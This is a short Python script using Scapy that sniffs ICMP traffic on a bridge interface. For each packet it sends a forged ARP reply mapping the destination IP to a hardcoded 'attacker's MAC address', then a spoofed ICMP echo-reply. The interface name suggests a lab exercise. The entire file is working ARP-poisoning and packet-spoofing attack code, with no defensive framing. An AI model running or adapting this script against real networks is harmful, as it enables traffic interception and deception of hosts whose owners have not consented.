from scapy.all import *

def print_pkt(pkt):
    pkt.show()

    # fake ARP reply to the sender, to make it think that the destination is at the attacker's MAC address
    arb = ARP()
    arb.hwsrc = '02:42:d7:69:44:75' # attacker's MAC address
    arb.hwdst = pkt["Ethernet"].src # sender's MAC address
    arb.psrc = pkt[IP].dst # destination IP address, it isn't the attacker's IP address
    arb.pdst = pkt[IP].src # source IP address, sender IP address

    p = arb
    send(p) # send the packet

    time.sleep(0.1)

    # create icmp reply to the sender
    a = IP(src=pkt[IP].dst , dst=pkt[IP].src, ihl=pkt[IP].ihl,len=pkt[IP].len, ) # create an IP header
    b = ICMP(type="echo-reply", id=pkt[ICMP].id, seq=pkt[ICMP].seq) # create an ICMP header
   
    p = a/b/pkt[Raw].load # combine the IP and ICMP headers and the payload of the original packet
    print("replying")
    p.show()
    send(p)

sniff(iface="br-0a3772abc032",filter="icmp", prn=print_pkt)
